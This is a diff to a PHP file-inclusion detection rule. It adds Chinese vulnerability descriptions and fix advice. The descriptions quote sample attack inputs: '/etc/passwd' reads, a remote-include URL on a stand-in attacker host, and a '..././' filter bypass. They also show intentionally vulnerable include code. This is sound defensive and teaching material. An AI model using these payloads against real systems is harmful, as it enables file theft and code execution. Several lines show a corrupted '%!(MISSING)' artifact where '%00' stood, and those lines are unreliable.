@@ -63,7 +63,7 @@ if (in_array($page, $allowed_pages)) {
 ```
 
 2. **对用户输入进行严格过滤和校验**
-移除或过滤用户输入中的恶意字符，特别是路径遍历字符（`../`、`..\`）、空字节（`%00`）等。同时，限制输入的文件名格式，例如只允许字母数字、下划线等。
+移除或过滤用户输入中的恶意字符，特别是路径遍历字符（`../`、`..\\`）、空字节（`%00`）等。同时，限制输入的文件名格式，例如只允许字母数字、下划线等。
 
 ```php
 <?php
@@ -127,12 +127,97 @@ CODE,exclude=<<<CODE
 CODE)> as $high
 
 alert $high for {
-    title: 'The file contained was detected without any filtering',
-    title_zh: '检测到文件包含无任何过滤',
-    type: 'vuln',
-    level: 'high',
-}
+	title: "Unfiltered PHP File Inclusion Vulnerability",
+	title_zh: "未过滤的PHP文件包含漏洞",
+	solution: <<<CODE
+### 修复建议
 
+1. **使用白名单限制包含文件**
+只允许包含预定义的安全文件列表中的文件，拒绝包含其他任何文件。这是最有效的防御方法。
+
+```php
+<?php
+$allowed_pages = array("home.php", "about.php", "contact.php");
+$page = $_GET['page'];
+
+if (in_array($page, $allowed_pages)) {
+    include($page);
+} else {
+    echo "Invalid page request.";
+}
+?>
+```
+
+2. **对用户输入进行严格过滤和校验**
+移除或过滤用户输入中的恶意字符，特别是路径遍历字符（`../`、`..\\`）、空字节（`%!`(MISSING)）等。同时，限制输入的文件名格式，例如只允许字母数字、下划线等。
+
+```php
+<?php
+$page = $_GET['page'];
+$page = str_replace(array('../', '..\\'), '', $page); // 移除路径遍历字符
+$page = preg_replace('/[^a-zA-Z0-9_.]/', '', $page); // 过滤非法字符
+
+// 可以进一步检查文件是否存在于预期目录中
+if (file_exists('templates/' . $page) && strpos(realpath('templates/' . $page), realpath('templates/')) === 0) {
+    include('templates/' . $page);
+} else {
+    echo "File not found or invalid path.";
+}
+?>
+```
+
+3. **禁用远程文件包含 (RFI)**
+在 PHP 配置文件 `php.ini` 中，将 `allow_url_include` 设置为 `Off`。
+```ini
+allow_url_include = Off
+```
+
+4. **限制文件上传目录的执行权限**
+如果应用程序允许文件上传，确保上传目录没有执行脚本的权限，即使攻击者成功上传了恶意脚本，也无法直接执行。
+
+5. **最小化路径**
+使用 `basename()` 或其他函数来仅获取文件名，并将其与一个安全的目录进行组合。
+
+```php
+<?php
+$filename = basename($_GET['file']);
+$filepath = '/safe/directory/' . $filename;
+
+if (file_exists($filepath)) {
+    include($filepath);
+} else {
+    echo "File not found.";
+}
+?>
+```
+CODE
+	desc: <<<CODE
+### 漏洞描述
+
+1. **漏洞原理**
+文件包含漏洞的核心在于应用程序在处理用户提供的文件名时，未对其进行充分的验证，导致攻击者能够控制包含的文件路径，包含并执行意料之外的文件。这可能源自使用了动态包含函数（如 PHP 的 `include`、`require`、`include_once`、`require_once`），并且将用户输入直接或间接地拼接到文件路径中。
+
+2. **触发场景**
+以下是一些可能导致文件包含漏洞的代码示例：
+
+- **直接使用用户输入作为文件路径**：
+```php
+<?php
+$page = $_GET['page'];
+include($page); // 用户输入直接用于 include 函数
+?>
+```
+攻击者可以构造 `?page=/etc/passwd` 来包含密码文件，或者构造 `?page=http://attacker.com/malicious.php`（如果允许远程包含）来执行远程脚本。
+
+3. **潜在影响**
+- **敏感信息泄露**：包含并显示服务器上的任意文件，如配置文件、源代码、日志文件等，泄露敏感信息。
+- **任意代码执行**：包含并执行攻击者上传或远程服务器上的恶意代码，完全控制受影响的服务器。
+- **拒绝服务**：包含大文件或设备文件可能导致服务器资源耗尽。
+
+CODE
+	level: "high",
+	type: "vuln",
+}
 $sink<dataflow(include=<<<CODE
 * & $params as $__next__
 CODE,exclude=<<<CODE
@@ -142,29 +227,166 @@ CODE)> as $highAndMid
 $highAndMid - $high as $middle
 
 alert $middle for {
-    title: 'File contains detected, but filter function not detected',
-    title_zh: '检测到文件包含，但未检出过滤函数',
-    type: 'mid',
-    level: 'mid'
-};
+	solution: <<<CODE
+### 修复建议
+
+1. **使用白名单限制包含文件**
+只允许包含预定义的安全文件列表中的文件，拒绝包含其他任何文件。这是最有效的防御方法。
+
+```php
+<?php
+$allowed_pages = array("home.php", "about.php", "contact.php");
+$page = $_GET['page'];
+
+if (in_array($page, $allowed_pages)) {
+    include($page);
+} else {
+    echo "Invalid page request.";
+}
+?>
+```
+
+2. **对用户输入进行严格过滤和校验**
+移除或过滤用户输入中的恶意字符，特别是路径遍历字符（`../`、`..\\`）、空字节（`%!`(MISSING)）等。同时，限制输入的文件名格式，例如只允许字母数字、下划线等。
+
+```php
+<?php
+$page = $_GET['page'];
+$page = str_replace(array('../', '..\\'), '', $page); // 移除路径遍历字符
+$page = preg_replace('/[^a-zA-Z0-9_.]/', '', $page); // 过滤非法字符
+
+// 可以进一步检查文件是否存在于预期目录中
+if (file_exists('templates/' . $page) && strpos(realpath('templates/' . $page), realpath('templates/')) === 0) {
+    include('templates/' . $page);
+} else {
+    echo "File not found or invalid path.";
+}
+?>
+```
+
+3. **禁用远程文件包含 (RFI)**
+在 PHP 配置文件 `php.ini` 中，将 `allow_url_include` 设置为 `Off`。
+```ini
+allow_url_include = Off
+```
+
+4. **限制文件上传目录的执行权限**
+如果应用程序允许文件上传，确保上传目录没有执行脚本的权限，即使攻击者成功上传了恶意脚本，也无法直接执行。
+
+5. **最小化路径**
+使用 `basename()` 或其他函数来仅获取文件名，并将其与一个安全的目录进行组合。
+
+```php
+<?php
+$filename = basename($_GET['file']);
+$filepath = '/safe/directory/' . $filename;
+
+if (file_exists($filepath)) {
+    include($filepath);
+} else {
+    echo "File not found.";
+}
+?>
+```
+CODE
+	desc: <<<CODE
+### 漏洞描述
+
+1. **漏洞原理**
+文件包含漏洞的核心在于应用程序在处理用户提供的文件名时，未对其进行充分的验证，导致攻击者能够控制包含的文件路径，包含并执行意料之外的文件。
+虽然存在过滤函数，但是过滤函数可能存在绕过风险，例如对大小写不敏感、只过滤一次等。
+
+2. **触发场景**
+以下是一些可能存在过滤绕过的文件包含漏洞代码示例：
+```php
+<?php
+$page = $_GET['page'];
+$page = str_replace("../", "", $page); // 仅移除一次../，可能被绕过
+include($page);
+?>
+```
+攻击者可以构造 `?page=..././etc/passwd` 尝试绕过过滤。
+
+3. **潜在影响**
+- **敏感信息泄露**：可能通过绕过过滤包含并显示服务器上的任意文件，如配置文件、源代码、日志文件等，泄露敏感信息。
+- **任意代码执行**：可能通过上传恶意文件，然后包含执行。
+- **拒绝服务**：包含大文件或设备文件可能导致服务器资源耗尽。
+
+CODE
+	level: "mid",
+	type: "mid",
+	title: "PHP File Inclusion with Insufficient Filtering",
+	title_zh: "PHP文件包含漏洞，但过滤不充分",
+}
 
 $sink - $high - $middle as $low;
 
 alert $low for {
-    title: 'File contains detected, filter function checked out',
-    title_zh: '检测到文件包含，检出过滤函数',
-    type: 'audit',
-    level: 'low'
-};
+	type: "audit",
+	title: "PHP File Inclusion with Filtering Functions",
+	title_zh: "PHP文件包含漏洞，检出过滤函数",
+	solution: <<<CODE
+### 修复建议
+虽然已经存在过滤函数，但仍建议：
+1. **代码审查**：定期审查过滤函数，确认其是否能够有效防止各种文件包含攻击，包括路径遍历、空字节注入等。
+2. **强化过滤**：如果可能，增加更严格的过滤规则，例如使用白名单机制，只允许包含预定义的安全文件列表中的文件。
+3. **最小权限原则**：确保运行PHP进程的用户权限最小化，以限制文件包含漏洞的影响范围。
 
-include(*?{!opcode: const}) as $info
-alert $info for{
-    title: "File contains were detected, but no vulnerabilities were detected. Please pay attention",
-    title_zh: "检测到文件包含，但是未检测到漏洞，请注意关注",
-    type: 'audit',
-    level: 'info'
+```php
+<?php
+// 示例：强化过滤，使用白名单
+$allowed = ['home.php', 'about.php', 'contact.php'];
+$filename = basename($_GET['file']); // 仅获取文件名
+if (in_array($filename, $allowed)) {
+    include $filename;
+} else {
+    echo 'Invalid file.';
+}
+?>
+```
+CODE
+	desc: <<<CODE
+### 风险描述
+
+1. **规则目的**
+该规则用于审计PHP代码中文件包含的地方，检测是否存在安全风险。
+
+2. **规则详细**
+尽管代码中已包含过滤机制，但仍需注意以下几点：
+- **过滤函数的有效性**：确认过滤函数是否能够有效防止路径遍历、空字节注入等攻击。
+- **白名单机制**：如果可能，建议使用白名单机制，只允许包含预定义的安全文件列表中的文件。
+- **最小权限原则**：确保运行PHP进程的用户权限最小化，以限制文件包含漏洞的影响范围。
+- **其他安全措施**：考虑实施其他安全措施，如禁用远程文件包含、限制文件上传目录的执行权限等。
+
+CODE
+	level: "low",
 }
 
+include(*?{!opcode: const}) as $info
+alert $info for {
+	title: "PHP File Inclusion Detected - Further Review Recommended",
+	title_zh: "检测到PHP文件包含，建议进一步审查",
+	solution: <<<CODE
+none
+CODE
+	desc: <<<CODE
+### 审计说明
+该规则用于审计PHP代码中文件包含的地方，尽管没有直接检测到漏洞，但是提醒开发者注意文件包含可能存在的风险，进行进一步审查。
+
+1. **审查目的**
+- 确认文件包含的必要性：是否存在替代方案，避免使用文件包含？
+- 验证包含的文件是否可信，是否存在被篡改的风险？
+- 检查代码逻辑，确认是否存在潜在的逻辑漏洞，可能导致恶意文件被包含？
+
+2. **审查建议**
+- 审查用户输入：如果文件包含路径依赖用户输入，务必进行严格验证和过滤。
+- 审查文件来源：确保被包含的文件来源可信，且没有被恶意篡改。
+- 实施最小权限原则：确保运行PHP进程的用户权限最小化，以限制文件包含的影响范围。
+
+CODE
+	level: "low",
+	type: "audit",
+}
 desc(
 	lang: php
 	alert_mid: 1
